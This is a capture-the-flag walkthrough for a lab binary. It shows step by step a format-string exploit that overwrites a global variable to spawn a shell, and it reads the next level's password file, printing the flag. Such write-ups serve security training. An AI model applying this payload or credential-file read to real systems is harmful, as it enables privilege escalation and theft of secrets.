# Level 3 Walkthrough

1. **Connect to the target machine**

	```bash
	ssh level3@<vm-ip> -p 4242
	```

2. **Check the files**

	```bash
	ls -l
	```

	Output:

	```
	-rwsr-s---+ 1 level3 users 5138 Mar  6  2016 level3
	```

3. **Test the binary**

	```bash
	./level3
	```

	It waits for input, echoes the input, and exits..


4. **Copy the binary locally for analysis**

	```bash
	scp -P 4242 level3@<vm-ip>:/home/user/level3/level3 .
	```

5. **Test the binary**

	```bash
	./level3
	```

	It echoes back our input.

6. **Disassemble and inspect with Ghidra**

	The vulnarable part:

	```c
	if (m == 64) {
		fwrite("Wait what?!\n", 1, 12, stdout);
		system("/bin/sh");
	}
	```

7. **Check binary in GDB for variables**

	```bash
	gdb level3
	(gdb) info variables m
	```

	Output:

	```
	0x0804988c  m
	```

	This means `m` is a global variable at address `0x0804988c`.

8. **Find our argument position in the stack**

	```bash
	echo "AAAA %x %x %x %x" | ./level3
	```

	Output:

	```
	AAAA 200 b7fd1ac0 b7ff37d0 41414141
	```

	Our "AAAA" appears in the **4th** position on the stack.

9. **Build and run the payload**

	```bash
	(printf '\x8c\x98\x04\x08'; printf 'A%.0s' {1..60}; echo '%4$n'; cat) | ./level3
	```

	Output:

	```
	�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	Wait what?!
	```

10. **Confirm shell and escalate**

	```bash
	whoami
	```

	Output:

	```
	level4
	```

11. **Read the password**

	```bash
	cat /home/user/level4/.pass
	```

	Output:

	```
	b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
	```
